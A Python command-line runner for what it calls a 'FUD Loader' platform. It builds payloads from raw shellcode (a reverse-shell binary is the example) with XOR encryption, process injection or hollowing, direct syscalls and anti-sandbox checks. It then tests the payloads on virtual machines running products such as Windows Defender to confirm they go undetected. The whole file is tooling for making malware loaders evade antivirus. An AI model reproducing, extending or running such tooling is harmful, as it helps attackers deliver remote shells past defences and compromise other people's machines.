import argparse
import os
import sys

# --- SETUP ĐƯỜNG DẪN IMPORT ---
# Thêm thư mục hiện tại (controller/) vào sys.path để Python tìm thấy config.py và core_engine.py
# khi bạn chạy lệnh từ thư mục gốc (FUD_Testing_Platform/)
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)

# --- IMPORTS ---
try:
    # Import các thành phần từ thư mục controller
    from controller import core_engine
    from controller.config import VMS_CONFIG, PROJECT_ROOT, OUTPUT_DIR, BUILD_DIR, LOGS_DIR
except ImportError as e:
    print(f"[!] Error importing modules: {e}")
    print("Ensure the 'controller' directory exists and has an '__init__.py' file.")
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="FUD Loader - Command-Line Test Runner")
    
    # --- Input & Build Options ---
    parser.add_argument("-s", "--shellcode", required=True, help="Path to the raw shellcode file (e.g., shellcodes/revshell_x64.bin)")
    parser.add_argument("-e", "--encryption", default="xor", choices=["none", "xor"], help="Encryption method to use.")
    parser.add_argument("-i", "--injection", default="classic", choices=["classic", "hollowing"], help="Injection technique to use.")
    parser.add_argument("--api-method", default="winapi", choices=["winapi", "winapi-indirect", "syscalls"], help="Method for calling Windows APIs.")
    
    # --- Evasion & Debug Options ---
    parser.add_argument("--anti-evasion", action="store_true", help="Enable anti-analysis and anti-sandbox checks.")
    parser.add_argument("--debug", action="store_true", help="Build the payload in debug mode (with popups).")

    # --- Test Execution Options ---
    parser.add_argument("-v", "--vms", nargs='*', help="List of VMs to test on (e.g., \"Windows Defender\"). Not required if --build-only is used.")
    
    # --- Mode Option ---
    parser.add_argument("--build-only", action="store_true", help="Only build the payload and exit without running tests.")

    args = parser.parse_args()

    # --- Validation ---
    if not args.build_only and not args.vms:
        parser.error("-v/--vms is required unless --build-only is specified.")

    # --- START ---
    print("="*50)
    print("      FUD AUTOMATED TEST RUNNER - CLI MODE")
    print("="*50)

    # 1. Xây dựng payload
    build_options = vars(args)
    
    # Chuyển đường dẫn shellcode thành tuyệt đối nếu cần
    if not os.path.isabs(args.shellcode):
        shellcode_path = os.path.join(PROJECT_ROOT, args.shellcode)
    else:
        shellcode_path = args.shellcode

    payload_path = core_engine.build_payload(shellcode_path, build_options)

    if not payload_path:
        print("\n[!] Payload build failed. Aborting.")
        return
    
    print(f"\n[SUCCESS] Payload built successfully at: {payload_path}")

    # Nếu chỉ build thì dừng tại đây
    if args.build_only:
        print("\n--build-only flag detected. Exiting now.")
        return

    # 2. Kiểm tra tên VM
    # Sử dụng VMS_CONFIG được import từ config.py
    for vm_name in args.vms:
        if vm_name not in VMS_CONFIG:
            print(f"[!] Error: VM name '{vm_name}' is not defined in controller/config.py.")
            print(f"    Available VMs: {list(VMS_CONFIG.keys())}")
            return

    # 3. Chạy test
    all_results = {}
    for vm_name in args.vms:
        # Gọi hàm run_single_test từ core_engine mới
        result = core_engine.run_single_test(vm_name, payload_path, build_options)
        all_results[vm_name] = result

    # 4. Báo cáo
    print("\n" + "="*50)
    print("                 FINAL REPORT")
    print("="*50)
    for vm_name, result in all_results.items():
        print(f"--- VM: {vm_name} ---")
        if result:
            status = result.get('status', 'UNKNOWN')
            print(f"Status: {status}")
            
            # Chỉ in log chi tiết nếu thất bại hoặc có lỗi
            if 'FAILED' in status or 'ERROR' in status:
                print("\n[Log Details]:")
                print(result.get('log', 'No log details available.'))
        else:
            print("Status: ERROR - Test did not return a result.")
        print("-" * (len(vm_name) + 8))


if __name__ == "__main__":
    # Đảm bảo các thư mục cần thiết tồn tại (sử dụng đường dẫn từ config)
    os.makedirs(BUILD_DIR, exist_ok=True)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # Tạo thêm thư mục logs nếu chưa có trong config
    test_logs_dir = os.path.join(PROJECT_ROOT, "test_logs")
    os.makedirs(test_logs_dir, exist_ok=True)
    
    main()